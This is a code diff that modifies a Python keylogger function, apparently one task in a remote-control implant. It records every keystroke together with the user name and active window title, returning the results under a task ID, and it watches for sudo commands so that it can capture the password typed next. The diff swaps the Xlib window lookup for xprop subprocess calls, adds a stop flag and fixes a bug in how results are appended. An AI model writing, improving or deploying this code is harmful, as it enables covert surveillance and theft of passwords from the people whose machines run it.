@@ -1,42 +1,50 @@
 def keylog(task_id):
 
-    from pynput import keyboard
-    import threading
-
-    import Xlib
-    import Xlib.display
-    import time
-    import subprocess
-
     global responses   
+
+
+    def get_active_window_title():
+        root = subprocess.Popen(['xprop', '-root', '_NET_ACTIVE_WINDOW'], stdout=subprocess.PIPE)
+        stdout, stderr = root.communicate()
+
+        m = re.search(b'^_NET_ACTIVE_WINDOW.* ([\w]+)$', stdout)
+        if m != None:
+            window_id = m.group(1)
+            window = subprocess.Popen(['xprop', '-id', window_id, 'WM_NAME'], stdout=subprocess.PIPE)
+            stdout, stderr = window.communicate()
+        else:
+            return "None"
+
+        match = re.match(b"WM_NAME\(\w+\) = (?P<name>.+)$", stdout)
+        if match != None:
+            return match.group("name").strip(b'"').decode()
+
+        return "None"
+
 
     def keylogger():
 
-        
         def on_press(key):
             global line
             global nextIsPsw
             global sudo
+            global break_function
 
-            display = Xlib.display.Display()
-            root = display.screen().root
-            windowID = root.get_full_property(display.intern_atom('_NET_ACTIVE_WINDOW'), Xlib.X.AnyPropertyType).value[0]
-            window = display.create_resource_object('window', windowID)
-            window_title = window.get_wm_class()[1]
+            if break_function:
 
-
-            if key == keyboard.Key.esc:
+                print("\t break detected, stopping keylog")
 
                 response = {
                         "task_id": task_id,
                         "user": getpass.getuser(), 
-                        "window_title": window_title, 
+                        "window_title": get_active_window_title(), 
                         "keystrokes": line,
                         "completed": True
                     }
                 
-                responses.append(responses)
+                responses.append(response)
                 line = ""
+                break_function = False
                 return False
             try:
                 line = line + key.char
@@ -90,22 +98,19 @@ def keylog(task_id):
                                 return False
                             else:
                                 print("[NO PASSWORD]")
-                                nextIsPsw == False                            
+                                nextIsPsw == False
+                                                 
 
                         if 'sudospace' in line:
                             nextIsPsw = True
 
 
-                        display = Xlib.display.Display()
-                        root = display.screen().root
-                        windowID = root.get_full_property(display.intern_atom('_NET_ACTIVE_WINDOW'), Xlib.X.AnyPropertyType).value[0]
-                        window = display.create_resource_object('window', windowID)
-                        window_title = window.get_wm_class()[1]
+                        line = line + "\n"
 
                         response = {
                                 "task_id": task_id,
                                 "user": getpass.getuser(), 
-                                "window_title": window_title, 
+                                "window_title": get_active_window_title(), 
                                 "keystrokes": line,
                             }
                         responses.append(response)
@@ -124,6 +129,8 @@ def keylog(task_id):
 
     thread2 = threading.Thread(target=keylogger, args=())
     thread2.start()
+
+    print("\t- Keylog Done")
 
 line = ""
 nextIsPsw = False
